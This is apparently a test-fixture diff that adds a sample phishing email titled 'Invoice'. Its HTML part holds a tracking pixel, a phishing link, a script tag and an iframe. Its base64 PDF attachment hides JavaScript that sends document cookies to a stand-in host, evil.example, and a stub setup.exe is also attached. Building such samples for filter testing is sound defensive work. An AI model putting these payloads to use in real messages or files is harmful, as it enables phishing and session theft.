@@ -1,0 +1,73 @@
+From: a@example.com
+To: b@example.org
+Subject: Invoice
+Date: Mon, 01 Jan 2024 10:00:00 +0000
+Received: from mail.internal.example ([10.1.2.3]) by mx.example
+X-Mailer: SecretMailer 1.0
+X-Originating-IP: 10.1.2.3
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============7096488859266759101=="
+
+--===============7096488859266759101==
+Content-Type: multipart/alternative;
+ boundary="===============1350656462992410009=="
+
+--===============1350656462992410009==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Plain body: please see invoice.
+
+--===============1350656462992410009==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>Hello <b>team</b></p><img src=3D"http://tracker.example/open.g=
+if?id=3D42" width=3D"1" height=3D"1"><a href=3D"http://phish.example/login">P=
+ay now</a><script>alert(1)</script><iframe src=3D"http://x.example"></iframe>=
+</body></html>
+
+--===============1350656462992410009==--
+
+--===============7096488859266759101==
+Content-Type: application/pdf
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice.pdf"
+MIME-Version: 1.0
+
+JVBERi0xLjMKJb/3ov4KMSAwIG9iago8PCAvT3BlbkFjdGlvbiA8PCAvSlMgKGFwcC5sYXVuY2hV
+UkxcKCdodHRwOi8vZXZpbC5leGFtcGxlLz9jPScrZG9jdW1lbnQuY29va2llXCkpIC9TIC9KYXZh
+U2NyaXB0ID4+IC9QYWdlTW9kZSAvVXNlTm9uZSAvUGFnZXMgMyAwIFIgL1R5cGUgL0NhdGFsb2cg
+Pj4KZW5kb2JqCjIgMCBvYmoKPDwgL0F1dGhvciAoYW5vbnltb3VzKSAvQ3JlYXRpb25EYXRlIChE
+OjIwMDAwMTAxMDAwMDAwKzAwJzAwJykgL0NyZWF0b3IgKGFub255bW91cykgL0tleXdvcmRzICgp
+IC9Nb2REYXRlIChEOjIwMDAwMTAxMDAwMDAwKzAwJzAwJykgL1Byb2R1Y2VyIChSZXBvcnRMYWIg
+UERGIExpYnJhcnkgLSBcKG9wZW5zb3VyY2VcKSkgL1N1YmplY3QgKHVuc3BlY2lmaWVkKSAvVGl0
+bGUgKHVudGl0bGVkKSAvVHJhcHBlZCAvRmFsc2UgPj4KZW5kb2JqCjMgMCBvYmoKPDwgL0NvdW50
+IDEgL0tpZHMgWyA0IDAgUiBdIC9UeXBlIC9QYWdlcyA+PgplbmRvYmoKNCAwIG9iago8PCAvQ29u
+dGVudHMgNSAwIFIgL01lZGlhQm94IFsgMCAwIDMwMCAzMDAgXSAvUGFyZW50IDMgMCBSIC9SZXNv
+dXJjZXMgPDwgL0ZvbnQgNiAwIFIgL1Byb2NTZXQgWyAvUERGIC9UZXh0IC9JbWFnZUIgL0ltYWdl
+QyAvSW1hZ2VJIF0gPj4gL1JvdGF0ZSAwIC9UcmFucyA8PCA+PiAvVHlwZSAvUGFnZSA+PgplbmRv
+YmoKNSAwIG9iago8PCAvTGVuZ3RoIDExMyAvRmlsdGVyIC9GbGF0ZURlY29kZSA+PgpzdHJlYW0K
+eJxFjDEKwkAURPs9xSss1GKdv64hWAoKgp3/AhIiKCYBCZ7fuCgyjykezBiaYqWbDnbO6mBYwq9Y
+jhk/sffw87n4KtZ/b9+LtUgb4R3zY/8abk3LOIyXx5aZSVFa4Hd8+Zn1JBUqMfFsOQfCG2RKHuAK
+ZW5kc3RyZWFtCmVuZG9iago2IDAgb2JqCjw8IC9GMSA3IDAgUiA+PgplbmRvYmoKNyAwIG9iago8
+PCAvQmFzZUZvbnQgL0hlbHZldGljYSAvRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZyAvTmFtZSAv
+RjEgL1N1YnR5cGUgL1R5cGUxIC9UeXBlIC9Gb250ID4+CmVuZG9iagp4cmVmCjAgOAowMDAwMDAw
+MDAwIDY1NTM1IGYgCjAwMDAwMDAwMTUgMDAwMDAgbiAKMDAwMDAwMDE4MSAwMDAwMCBuIAowMDAw
+MDAwNDM5IDAwMDAwIG4gCjAwMDAwMDA0OTggMDAwMDAgbiAKMDAwMDAwMDY4NyAwMDAwMCBuIAow
+MDAwMDAwODcyIDAwMDAwIG4gCjAwMDAwMDA5MDMgMDAwMDAgbiAKdHJhaWxlciA8PCAvSW5mbyAy
+IDAgUiAvUm9vdCAxIDAgUiAvU2l6ZSA4IC9JRCBbPDFjMTc4MTk4ZmJkZmE1MWIyNTk5NWQ4OWQ0
+MTAyMDQzPjwyZTdjYmQyZDZkYWM1OTU3ZTg4MTdhNDYzN2FhNDRiND5dID4+CnN0YXJ0eHJlZgox
+MDEwCiUlRU9GCg==
+
+--===============7096488859266759101==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="setup.exe"
+MIME-Version: 1.0
+
+TVoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAA
+
+--===============7096488859266759101==--
